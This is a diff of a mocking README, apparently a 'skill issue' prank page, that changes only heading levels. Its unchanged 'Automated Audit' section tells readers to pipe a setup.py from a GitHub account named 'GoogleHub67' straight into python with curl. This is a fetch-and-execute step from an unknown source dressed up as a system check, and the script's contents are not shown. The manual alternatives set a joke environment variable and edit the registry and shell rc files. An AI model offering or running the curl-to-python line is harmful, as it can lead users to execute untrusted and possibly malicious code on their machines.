@@ -275,37 +275,37 @@ Choose your compliance pathway below to evaluate your technical vulnerability.
 
 ---
 
-## 🏎️ Pathway A: The Automated Audit (High Compliance)
+#### 🏎️ Pathway A: The Automated Audit (High Compliance)
 Run this single line to automatically detect your operating system archetype, audit your GUI dependence, and inject a localized environment reality check directly into your system core.
 
-### 🪟 Windows (PowerShell)
+##### 🪟 Windows (PowerShell)
 ```powershell
 curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
 ```
 
-### 🍏 / 🐧 macOS & Linux (Terminal)
+##### 🍏 / 🐧 macOS & Linux (Terminal)
 ```bash
 curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
 ```
 
 ---
 
-## 💤 Pathway B: The Manual Vector (Paranoid/Isolated)
+#### 💤 Pathway B: The Manual Vector (Paranoid/Isolated)
 If you suffer from trust issues or are too lazy to open files and prefer to audit the payloads locally before executing your configuration realignment, evaluate your terminal environment using the manual strings below:
 
-### 🪟 Windows PowerShell 
+##### 🪟 Windows PowerShell 
 The gold standard for automated self-reflection. Run this to gracefully inject a reality check directly into your user environment scope:
 ```powershell
 [Environment]::SetEnvironmentVariable("SKILL_ISSUE", $true, "User"); Write-Host "==================================================="; Write-Host "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED"; Write-Host "[!] CURRENT SKILL_ISSUE STATUS: $([Environment]::GetEnvironmentVariable('SKILL_ISSUE', 'User'))"; Write-Host "==================================================="; Write-Host "Congratulations. You successfully executed an environment scope modification because clicking via GUI was too hard."; Write-Host "Next time, try not to break your PATH configuration."
 ```
 
-### 🖥️ Windows CMD (Command Prompt)
+##### 🖥️ Windows CMD (Command Prompt)
 If you refuse to leave the 1990s and prefer your automation served cold, force it straight into your registry to spawn a fresh diagnostic scope:
 ```cmd
 REG ADD HKCU\Environment /v SKILL_ISSUE /t REG_SZ /d true /f && start cmd /v:on /k "echo =================================================== && echo [!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED && echo [!] CURRENT SKILL_ISSUE STATUS: true && echo =================================================== && echo Congratulations. You successfully restarted a window because clicking via GUI was too hard. && echo Next time, try not to break your PATH configuration." && exit
 ```
 
-### 🐧 Unix Shells (Bash / Zsh)
+##### 🐧 Unix Shells (Bash / Zsh)
 For the Linux gatekeepers and macOS purists who think using a terminal makes them an elite hacker. Permanent self-sabotage is just an append command away:
 ```bash
 echo 'export SKILL_ISSUE="true"' >> ~/."$(basename "$SHELL")"rc && source ~/."$(basename "$SHELL")"rc && echo "===================================================" && echo "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED" && echo "[!] CURRENT SKILL_ISSUE STATUS: $SKILL_ISSUE" && echo "===================================================" && echo "Congratulations. You successfully appended a configuration file because clicking via GUI was too hard." && echo "Next time, try not to break your PATH configuration."
